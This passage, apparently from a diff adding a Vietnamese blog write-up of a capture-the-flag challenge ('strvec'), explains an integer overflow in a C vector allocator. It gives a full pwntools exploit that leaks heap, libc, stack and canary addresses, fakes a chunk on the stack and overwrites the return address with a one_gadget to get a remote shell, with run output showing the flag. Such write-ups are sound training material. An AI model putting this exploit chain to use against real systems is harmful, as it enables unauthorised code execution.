+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> readint(<span style="color:#e6db74">&#34;n = &#34;</span>);
+</span></span><span style="display:flex;"><span>  vector <span style="color:#f92672">*</span>vec <span style="color:#f92672">=</span> vector_new(n);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>vec)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> choice <span style="color:#f92672">=</span> readint(<span style="color:#e6db74">&#34;1. get</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2. set</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (choice) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> readint(<span style="color:#e6db74">&#34;idx = &#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)vector_get(vec, idx);
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;vec.get(idx) -&gt; %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, data <span style="color:#f92672">?</span> data : <span style="color:#e6db74">&#34;[undefined]&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> readint(<span style="color:#e6db74">&#34;idx = &#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">0x20</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      readline(<span style="color:#e6db74">&#34;data = &#34;</span>, data, <span style="color:#ae81ff">0x20</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> result <span style="color:#f92672">=</span> vector_set(vec, idx, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)data);
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;vec.set(idx, data) -&gt; %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        free(data);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>      vector_delete(vec);
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;Bye, %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__attribute__((constructor))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> setup(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  setvbuf(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  alarm(<span style="color:#ae81ff">180</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Nhìn sơ qua thì có vẻ là 1 bài heap.</p>
+<h2 id="solution-2">Solution:<a hidden class="anchor" aria-hidden="true" href="#solution-2">#</a></h2>
+<p>Bug nằm ở đoạn code dưới đây:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>vector <span style="color:#f92672">*</span><span style="color:#a6e22e">vector_new</span>(<span style="color:#66d9ef">int</span> nmemb) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (nmemb <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> size <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(vector) <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>) <span style="color:#f92672">*</span> nmemb;
+</span></span><span style="display:flex;"><span>  vector <span style="color:#f92672">*</span>vec <span style="color:#f92672">=</span> (vector<span style="color:#f92672">*</span>)malloc(size);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>vec)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  memset(vec, <span style="color:#ae81ff">0</span>, size);
+</span></span><span style="display:flex;"><span>  vec<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> nmemb;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> vec;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Nếu <code>nmemb</code> == <code>2147483647</code> thì <code>size</code> sẽ là 0 (<code>integer overflow</code>), và <code>vec-&gt;size</code> không được update bằng <code>size</code> mà lại là <code>nmemb</code> nên mình có thể thực hiện <code>out-of-bounds read and write</code>. Mình sẽ dùng lỗi oob để leak heap với libc trước:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2147483647&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;heap_leak: &#39;</span> <span style="color:#f92672">+</span> hex(heap_leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> heap_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2f0</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;heap_base: &#39;</span> <span style="color:#f92672">+</span> hex(heap_base))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>count <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Prepare to free a chunk into unsorted bin</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">35</span>):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(i <span style="color:#f92672">==</span> count):
+</span></span><span style="display:flex;"><span>		count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>	set(i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">3</span>, p64(heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2d0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x531</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">0</span>, p64(heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x300</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;vec.get(idx) -&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc_leak: &#39;</span> <span style="color:#f92672">+</span> hex(libc_leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ebbe0</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc_base: &#39;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
+</span></span></code></pre></div><p>Sau khi đã có heap với libc address thì mình đã stuck khá lâu do mình chỉ có thể &lsquo;mess&rsquo; được với 1 chunk, mà size thì lại cố định là <code>0x20</code> nữa nên hầu hết các kỹ thuật đều rất khó thực hiện. Một lúc sau thì mình mới tự hỏi: &lsquo;Ủa nãy giờ biến name khum thấy m xài zậy!??&rsquo;.</p>
+<p><img loading="lazy" src="/img/cat.jpg" alt="img"  />
+</p>
+<p>Và thế là 1 idea mới xuất hiện. Mình sẽ tạo 1 fake chunk trên stack bằng cách set biến name thành metadata với size của 1 chunk rồi sẽ <code>free</code> nó, lần <code>malloc</code> tiếp theo sẽ trả về fake chunk đó. Cuối cùng thì mình ghi đè return address thành <code>one gadget</code>.</p>
+<h2 id="final-script-2">Final script<a hidden class="anchor" aria-hidden="true" href="#final-script-2">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./strvec&#39;)</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.31.so&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;168.119.108.148&#39;</span>, <span style="color:#ae81ff">12010</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set</span>(idx, data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;= &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;= &#39;</span>, bytes(data))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(idx):
+</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;= &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a fake chunk</span>
+</span></span><span style="display:flex;"><span>name <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x31</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2147483647&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;heap_leak: &#39;</span> <span style="color:#f92672">+</span> hex(heap_leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> heap_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2f0</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;heap_base: &#39;</span> <span style="color:#f92672">+</span> hex(heap_base))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>count <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Prepare to free a chunk into unsorted bin</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">35</span>):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(i <span style="color:#f92672">==</span> count):
+</span></span><span style="display:flex;"><span>		count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>	set(i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">3</span>, p64(heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2d0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x531</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">0</span>, p64(heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x300</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;vec.get(idx) -&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc_leak: &#39;</span> <span style="color:#f92672">+</span> hex(libc_leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ebbe0</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc_base: &#39;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Environ variable stores a stack address</span>
+</span></span><span style="display:flex;"><span>environ <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;environ&#39;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;environ: &#39;</span> <span style="color:#f92672">+</span> hex(environ))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>one_gadget <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe6c81</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;one_gadget: &#39;</span> <span style="color:#f92672">+</span> hex(one_gadget))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">35</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">0</span>, p64(environ))
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">3</span>, p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get(<span style="color:#ae81ff">11</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;vec.get(idx) -&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stack_leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;stack_leak: &#39;</span> <span style="color:#f92672">+</span> hex(stack_leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fake_chunk <span style="color:#f92672">=</span> stack_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x118</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">0</span>, p64(stack_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10f</span>) <span style="color:#f92672">+</span> p64(fake_chunk) <span style="color:#f92672">+</span> p64(heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2a0</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>get(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;vec.get(idx) -&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip())
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;canary: &#39;</span> <span style="color:#f92672">+</span> hex(canary))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">36</span>, p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(one_gadget)[:<span style="color:#ae81ff">6</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reset the size by freeing vec</span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Change bk pointer to double free</span>
+</span></span><span style="display:flex;"><span>set(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get shell!</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 168.119.108.148 on port 12010: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> heap_leak: 0x5606633792f0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> heap_base: 0x560663379000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> libc_leak: 0x7f186db1cbe0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> libc_base: 0x7f186d931000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> environ: 0x7f186db202e0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> one_gadget: 0x7f186da17c81
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> stack_leak: 0x7ffea895dda8
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> canary: 0x3936128e303f100
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>Bye, !
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>999<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>999<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>999<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>chall
+</span></span><span style="display:flex;"><span>flag-970df57dcd98b545bb0b620bc4b6cab0.txt
+</span></span><span style="display:flex;"><span>$ cat flag-970df57dcd98b545bb0b620bc4b6cab0.txt
+</span></span><span style="display:flex;"><span>ASIS<span style="color:#f92672">{</span>n0_1d34_4_g00d_fl4g_t3xt_59723644e687a5c5e2fe80eae0b4f4b8<span style="color:#f92672">}</span>
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://pivik271.github.io/">pivik</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
